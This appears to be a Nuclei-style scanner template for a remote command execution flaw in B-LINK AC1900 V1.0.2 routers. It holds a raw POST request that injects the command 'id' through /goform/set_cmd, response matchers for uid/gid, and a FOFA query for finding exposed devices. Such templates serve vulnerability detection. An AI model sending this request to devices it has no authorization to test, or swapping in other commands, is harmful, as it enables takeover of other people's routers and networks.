http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - uid=
            - gid=
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /goform/set_cmd HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36

          cmd=id
id: B-LINK-AC1900-V1_0_2-RCE
info:
    author: Superhero
    description: |-
        fofa: title=="B-LINK"
        B-LINK AC1900 V1.0.2 接口存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
    name: B-LINK AC1900 V1.0.2 命令执行漏洞
    reference:
        - https://mp.weixin.qq.com/s/7lDV1YDhengIH3TBCW54Ug
    severity: high
    tags: []
